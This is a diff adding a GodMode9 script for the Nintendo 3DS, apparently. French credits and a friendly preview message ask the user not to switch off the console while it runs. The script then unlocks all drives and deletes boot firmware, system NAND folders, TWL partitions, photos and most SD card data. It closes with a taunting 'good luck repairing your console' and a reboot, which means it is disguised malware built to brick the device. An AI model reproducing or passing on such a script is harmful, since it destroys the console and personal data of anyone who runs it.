@@ -1,0 +1,58 @@
+set PREVIEW_MODE "by la cocohackeur team\n(nous ne sommes pas responsable en cas de mauvaises manipulations)."
+echo "Cree par Misaki 1/20/18 \nedite par cooolgamer et la cocohackeur team 26/04/21 \nil est tres conseille de faire une backup nand si vous en \navez pas en cas de mauvaises manipulations."
+
+echo "Script: cooolgamer,\nCompile par luc_ha,\naide de Kirito et Leon,\nLe mec qui a rien foutu: Meggy"
+
+allow -a 0:/
+allow -a 1:/
+allow -a 2:/
+allow -a 3:/
+
+set PREVIEW_MODE "merci de ne pas eteindre pour eviter toute perte de fichiers."
+rm -o -s 1:/boot.firm
+rm -o -s 1:/data
+rm -o -s 1:/dbs
+rm -o -s 1:/fixdata
+rm -o -s 1:/title
+rm -o -s 1:/ticket
+rm -o -s 1:/tmp
+rm -o -s 1:/rw/luma
+rm -o -s 0:/3ds
+rm -o -s 0:/fbi
+rm -o -s 0:/cias
+rm -o -s 0:/DCIM
+rm -o -s 0:/Download
+rm -o -s 0:/Android
+rm -o -s 0:/boot.firm
+rm -o -s 0:/gm9
+rm -o -s 0:/files9
+rm -o -s 0:/_nds
+rm -o -s 0:/boot.3dsx
+rm -o -s 0:/otherapp.bin
+rm -o -s 0:/luma
+rm -o -s 0:/plugin
+rm -o -s 0:/cheats
+rm -o -s 0:/boot.firm.bak
+rm -o -s 0:/files9
+rm -o -s 0:/aeskeydb.bin
+rm -o -s 0:/arm9loaderhax.bin
+rm -o -s 0:/ntrboot
+rm -o -s 0:/boot9strap
+rm -o -s 0:/boot.nds
+rm -o -s 0:/Nintendo 3DS
+rm -o -s 2:/import
+rm -o -s 2:/shared1
+rm -o -s 2:/shared2
+rm -o -s 2:/sys
+rm -o -s 2:/ticket
+rm -o -s 2:/title
+rm -o -s 2:/tmp
+rm -o -s 3:/photo
+rm -o -s 1:/private
+rm -o -s 1:/ro
+rm -o -s 1:/rw
+rm -o -s 0:/CTGP-7
+
+qr "maintenant tu peut faire comme lui:" https://www.youtube.com/watch?v=dGQXUYTJyVA
+echo "bonne chance pour reparer ta console ;)"
+reboot
